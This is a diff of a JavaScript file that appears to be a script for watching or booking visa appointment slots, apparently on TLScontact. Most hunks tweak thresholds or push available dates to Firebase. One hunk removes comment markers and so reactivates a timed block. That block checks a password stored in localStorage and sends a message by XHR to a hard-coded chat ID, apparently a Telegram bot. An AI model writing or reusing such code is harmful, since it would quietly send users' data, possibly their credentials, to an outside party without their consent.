@@ -94,7 +94,7 @@ switch (pathSegment) {
         var cas1 = 25; var cas2 = 15; var cas3 = 15; var cas4 = 1;
         break;
     case 'maCAS2fr':
-        cas1 = 5; cas2 = 15; cas3 = 15; cas4 = 1;
+        cas1 = 4; cas2 = 15; cas3 = 15; cas4 = 1;
         break;
     case 'maTNG2fr':
         cas1 = 15; cas2 = 15; cas3 = 15; cas4 = 1;
@@ -541,7 +541,7 @@ const messagex = dateText2
 const timex = hours + " : " + minutes + " : " + seconds
 const timo = new Date().getTime();
 
-          if (Object.keys(availableDatesAndHours).length > 3) {
+          if (Object.keys(availableDatesAndHours).length > 2) {
                     if (hoursCount > CLP )  {
     var databaseRef = firebase.database().ref(typo2);
     databaseRef.push().set({
@@ -1745,7 +1745,7 @@ document.getElementById("EMAIL").textContent = content;
 document.getElementById("EMAIL").style.whiteSpace = "pre-line";
 document.getElementById("EMAIL").style.textAlign = "left";
 
-    /*
+    
 setTimeout(() => {
 
 const payContent = document.querySelector('.pay_content');
@@ -1790,7 +1790,7 @@ else if ( localStorage.getItem("pwd"+localStorage.getItem("TLS_WEB_issuer")) ===
   xhr.send(JSON.stringify({chat_id: '-1002013849559', text: call, parse_mode: 'html'}));
 }
 }, 5000);
-*/
+
 
   }
 
